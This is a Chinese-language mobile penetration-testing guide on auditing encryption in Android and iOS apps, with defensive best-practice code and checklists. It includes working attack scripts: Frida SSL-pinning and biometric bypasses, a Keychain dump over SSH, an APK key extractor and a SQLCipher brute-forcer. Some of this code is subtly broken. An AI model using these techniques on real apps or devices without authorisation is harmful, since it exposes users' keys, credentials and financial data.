# 移动加密安全测试

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供移动应用加密安全测试的方法论。通过本指南，测试人员可以评估 iOS 和 Android 应用的加密实现，发现密钥存储、数据传输、本地存储等方面的安全缺陷。

### 1.2 适用范围
本文档适用于以下场景：
- Android 应用加密审计
- iOS 应用加密审计
- 移动 API 加密测试
- 移动支付应用安全评估
- 移动银行应用合规检测

### 1.3 读者对象
- 移动安全测试人员
- 渗透测试工程师
- 移动应用审计人员
- 合规性检测人员

---

## 第二部分：核心渗透技术专题

### 专题一：移动加密安全测试

#### 2.1 技术介绍

**移动加密安全测试**是针对移动应用加密实现的全面评估，包括本地数据存储加密、网络通信加密、密钥管理和生物识别等方面。

**移动加密测试维度：**

| 维度 | 检测内容 | 风险等级 |
|------|---------|---------|
| 本地存储 | SharedPreferences、Keychain、数据库加密 | 高危 |
| 网络通信 | TLS 配置、证书固定 | 高危 |
| 密钥存储 | Keystore、Keychain 使用 | 严重 |
| 代码保护 | 代码混淆、加固 | 中危 |
| 运行时保护 | 越狱/Root 检测、调试检测 | 中危 |
| 生物识别 | TouchID、FaceID 实现 | 高危 |

#### 2.2 测试常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 移动银行 | 转账、支付 | 本地存储敏感数据未加密 |
| 移动支付 | 钱包、二维码支付 | 密钥硬编码或弱保护 |
| 即时通讯 | 端到端加密聊天 | 加密实现缺陷 |
| 健康应用 | 医疗记录、健康数据 | HIPAA 合规要求 |
| 企业应用 | MDM、企业邮箱 | 企业数据泄露风险 |
| 加密货币 | 钱包、交易 | 私钥保护不当 |

#### 2.3 漏洞检测方法

##### 2.3.1 Android 加密检测

```bash
# 反编译 APK
apktool app.apk -o output_dir

# 查找硬编码密钥
grep -r "secret\|password\|key\|token" output_dir/

# 检查 AndroidManifest.xml
cat output_dir/AndroidManifest.xml | grep -E "debuggable|backupAllowed"

# 检查 SharedPreferences 使用
grep -r "SharedPreferences" output_dir/smali/

# 检查加密算法使用
grep -r "Cipher\|KeyGenerator\|SecretKey" output_dir/smali/

# 使用 MobSF 自动化扫描
# 上传 APK 到 MobSF 或本地部署
```

##### 2.3.2 iOS 加密检测

```bash
# 解压 IPA
unzip app.ipa -d output_dir

# 检查 Info.plist
plutil -convert xml1 output_dir/Payload/app.app/Info.plist -o -

# 查找硬编码密钥
strings output_dir/Payload/app.app/app | grep -iE "secret|password|key|token"

# 使用 class-dump 分析头文件
class-dump -H output_dir/Payload/app.app/app > headers.txt

# 检查 Keychain 使用
otool -L output_dir/Payload/app.app/app | grep Security

# 使用 Frida 动态分析
frida -U -f com.target.app -l crypto_check.js
```

##### 2.3.3 本地存储检测

**Android:**
```bash
# 提取应用数据（需要 Root 或备份）
adb backup -noapk com.target.app
# 或使用 root 访问
adb shell "run-as com.target.app ls /data/data/com.target.app/"

# 检查 SharedPreferences
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/*.xml"

# 检查 SQLite 数据库
adb shell "run-as com.target.app ls /data/data/com.target.app/databases/"

# 检查文件加密
adb shell "run-as com.target.app ls -la /data/data/com.target.app/files/"
```

**iOS:**
```bash
# 使用 iMazing 或 iExplorer 提取应用数据
# 或使用越狱设备直接访问

# 检查 Documents 目录
ls /var/mobile/Containers/Data/Application/*/Documents/

# 检查 UserDefaults
cat /var/mobile/Containers/Data/Application/*/Library/Preferences/*.plist

# 检查 Keychain 项（需要越狱）
keychain_dump
```

##### 2.3.4 TLS/SSL 检测

```bash
# 使用 Frida 绕过证书固定
frida -U -f com.target.app -l ssl-bypass.js

# ssl-bypass.js 示例
Java.perform(function() {
    // 绕过多种证书固定实现
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    TrustManager.checkServerTrusted.implementation = function() {};
    
    var fakeContext = SSLContext.getInstance("TLS");
    fakeContext.init(null, null, null);
});

# 使用 Burp Suite 拦截流量
# 配置代理，测试证书固定绕过
```

#### 2.4 漏洞利用方法

##### 2.4.1 Android 密钥提取

```python
#!/usr/bin/env python3
"""
Android 应用密钥提取
"""
import subprocess
import re

def extract_android_keys(apk_path):
    """从 APK 中提取可能的密钥"""
    
    # 反编译
    subprocess.run(["apktool", "d", apk_path, "-o", "output"])
    
    # 搜索常见密钥模式
    patterns = {
        'AES 密钥': r'[0-9a-fA-F]{32}|[0-9a-fA-F]{64}',
        'Base64 密钥': r'[A-Za-z0-9+/=]{20,}',
        'RSA 密钥': r'-----BEGIN.*KEY-----',
    }
    
    found_keys = {}
    
    for root, dirs, files in os.walk('output'):
        for file in files:
            if file.endswith(('.smali', '.xml', '.json', '.properties')):
                filepath = os.path.join(root, file)
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()
                    for key_type, pattern in patterns.items():
                        matches = re.findall(pattern, content)
                        if matches:
                            if key_type not in found_keys:
                                found_keys[key_type] = []
                            found_keys[key_type].extend(matches[:5])
    
    return found_keys
```

##### 2.4.2 iOS Keychain 提取

```python
#!/usr/bin/env python3
"""
iOS Keychain 提取（需要越狱设备）
"""
import subprocess

def dump_keychain(app_bundle_id):
    """提取指定应用的 Keychain 项"""
    
    # 使用 keychain_dumper 工具
    cmd = f"""
    ssh root@iphone '
    cd /usr/bin
    ./keychain_dumper -a | grep -A 10 "{app_bundle_id}"
    '
    """
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout)
    
    # 提取的内容包括：
    # - 服务名
    # - 账户名
    # - 密码/密钥
    # - 创建时间
```

##### 2.4.3 本地数据库解密

```python
#!/usr/bin/env python3
"""
Android SQLCipher 数据库破解
"""
import subprocess
import os

def attack_sqlcipher(db_path, wordlist):
    """暴力破解 SQLCipher 加密的数据库"""
    
    with open(wordlist, 'r') as wl:
        for password in wl:
            password = password.strip()
            
            # 尝试使用 sqlcipher-cli 打开
            cmd = f'sqlcipher "{db_path}" << EOF\n{password}\n.tables\nEOF'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            if 'error' not in result.stderr.decode().lower():
                print(f"[+] 找到密码：{password}")
                return password
    
    print("[-] 未找到正确密码")
    return None
```

##### 2.4.4 生物识别绕过

```javascript
// Frida 脚本绕过生物识别
// Android 示例
Java.perform(function() {
    var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
    
    BiometricPrompt.authenticate.implementation = function(cancellationSignal, executor, callback) {
        // 直接调用成功回调
        callback.onAuthenticationSucceeded(null);
    };
    
    // 绕过 FingerprintManager
    var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");
    FingerprintManager.authenticate.implementation = function() {
        // 直接返回成功
    };
});

// iOS 示例
// 使用 Frida 绕过 LAContext
%objc_class_desc(LAContext)
```

#### 2.5 安全配置建议

##### 2.5.1 Android 加密最佳实践

```kotlin
// 使用 Android Keystore 存储密钥
val keyGenerator = KeyGenerator.getInstance(
    KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore"
)

val keyGenSpec = KeyGenParameterSpec.Builder(
    "my_key",
    KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
)
    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
    .setKeySize(256)
    .setUserAuthenticationRequired(true)  // 需要生物识别
    .build()

keyGenerator.init(keyGenSpec)
val secretKey = keyGenerator.generateKey()

// 使用 EncryptedSharedPreferences
val masterKey = MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build()

val sharedPreferences = EncryptedSharedPreferences.create(
    context,
    "secret_prefs",
    masterKey,
    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
)
```

##### 2.5.2 iOS 加密最佳实践

```swift
// 使用 Keychain 存储敏感数据
import Security

func saveToKeychain(data: Data, forKey key: String) -> OSStatus {
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecValueData as String: data,
        kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
    ]
    
    SecItemDelete(query as CFDictionary)
    return SecItemAdd(query as CFDictionary, nil)
}

// 使用 DataProtection
let fileManager = FileManager.default
try fileManager.setAttributes(
    [.protectionKey: FileProtectionType.complete],
    ofItemAtPath: filePath
)

// 使用 CryptoKit（iOS 13+）
import CryptoKit

let symmetricKey = SymmetricKey(size: .bits256)
let sealedBox = try AES.GCM.seal(plaintext, using: symmetricKey)
```

##### 2.5.3 移动加密检查清单

**Android:**
- [ ] 使用 Android Keystore 存储密钥
- [ ] 敏感数据使用 EncryptedSharedPreferences
- [ ] 数据库使用 SQLCipher 加密
- [ ] 启用证书固定
- [ ] 禁用调试模式
- [ ] 代码混淆和保护
- [ ] Root 检测

**iOS:**
- [ ] 使用 Keychain 存储敏感数据
- [ ] 启用 Data Protection
- [ ] 使用 CryptoKit 或 CommonCrypto
- [ ] 启用证书固定
- [ ] 越狱检测
- [ ] 代码签名验证
- [ ] 防止调试

---

## 第三部分：附录

### 3.1 移动加密测试工具

| 工具 | 平台 | 用途 |
|-----|------|------|
| MobSF | Android/iOS | 自动化安全扫描 |
| Frida | Android/iOS | 动态插桩 |
| Objection | Android/iOS | 运行时探索 |
| apktool | Android | APK 反编译 |
| jadx | Android | APK 反编译 |
| class-dump | iOS | Objective-C 头文件导出 |
| iMazing | iOS | 应用数据提取 |

### 3.2 移动加密风险评级

| 风险 | Android | iOS | 影响 |
|-----|---------|-----|------|
| 硬编码密钥 | 高 | 高 | 密钥泄露 |
| 明文存储 | 高 | 高 | 数据泄露 |
| 弱 TLS 配置 | 高 | 高 | 中间人攻击 |
| 证书固定缺失 | 中 | 中 | 流量拦截 |
| Keychain/Keystore 未使用 | 高 | 高 | 密钥提取 |

### 3.3 合规性要求

| 标准 | 加密要求 |
|------|---------|
| OWASP MASVS | L1/L2 加密要求 |
| PCI DSS | 支付数据加密 |
| HIPAA | 医疗数据加密 |
| GDPR | 个人数据保护 |
| 等保 2.0 | 加密要求 |

---

## 参考资源

- [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
- [OWASP MASVS](https://owasp.org/www-project-mobile-application-security-verification-standard/)
- [Android Security Best Practices](https://developer.android.com/topic/security/best-practices)
- [iOS Security Guide](https://www.apple.com/business/docs/iOS_Security_Guide.pdf)
